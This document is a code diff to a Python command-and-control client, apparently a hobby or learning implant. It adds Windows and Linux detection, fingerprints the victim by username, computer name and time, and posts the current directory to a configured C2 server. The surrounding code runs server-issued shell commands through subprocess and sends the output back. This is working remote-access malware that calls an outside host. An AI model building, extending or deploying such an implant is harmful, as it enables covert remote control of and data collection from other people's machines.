@@ -2,9 +2,15 @@
 Command & Control Client Side Coding
 Author: Davood Yakuza
 """
+from platform import system
+
+# Import for Windows Builds only
+if system() == "Windows":
+    from os import getenv, chdir, path, getcwd
 
 # Import for Linux Builds only
-#from os import getenv, uname, chdir, path,
+elif system() == "Linux":
+    from os import getenv, uname, chdir, path, getcwd
 
 # Import for both Linux & Windows Builds
 from requests import get, exceptions, post
@@ -14,18 +20,24 @@ from subprocess import run, PIPE, STDOUT
 # Custom Features Import
 from colorama import Fore
 
-# Import for Windows Builds only
-from os import getenv, chdir, path
 
 # Constants Import
-from settings import PORT, CMD_REQUEST, RESPONSE, RESPONSE_KEY, C2_SERVER, DELAY, PROXY, HEADERS
+from settings import CMD_REQUEST,CWD_RESPONSE, RESPONSE, RESPONSE_KEY, C2_SERVER, DELAY, PORT, PROXY, HEADERS
 
+# If Client have Windows OS
+if system() == "Windows":
+    # For Windows obtain a unique identifying Information
+    client = (getenv("USERNAME","Unknown-Username") + "@" +
+              getenv("COMPUTERNAME","Unknown-Computer Name") + "@" + str(time()))
 
-# For Windows obtain a unique identifying Information
-client = getenv("USERNAME","Unknown-Username") + "@" + getenv("COMPUTERNAME","Unknown-Computer Name") + "@" + str(time())
+# Elif Client have Linux OS
+elif system() == "Linux":
+    # For Linux, get a unique identifying Information
+    client = getenv("LOGNAME","Unknown-Username") + "@" + uname().nodename + "@" + str(time())
 
-# For Linux, get a unique identifying Information
-#client = getenv("LOGNAME","Unknown-Username") + "@" + uname().nodename + "@" + str(time())
+# If OS is not windows or linux, use a Linux version of the client
+else:
+    client = getenv("LOGNAME","Unknown-Username") + "@" + uname().nodename + "@" + str(time())
 
 # Print C2 Client Side Message for avoid complexing in test operation
 print(Fore.LIGHTMAGENTA_EX+"[+]-------------C2 Client Side-------------[+]"+Fore.RESET)
@@ -90,6 +102,8 @@ while True:
             post_to_server(f"You have don't Permission to Access{directory}.\n")
         except OSError:
             post_to_server("There was a Operation System Error on client.\n")
+        else:
+            post_to_server(getcwd(),CWD_RESPONSE)
 
     else:
         # Run command using subprocess.run module
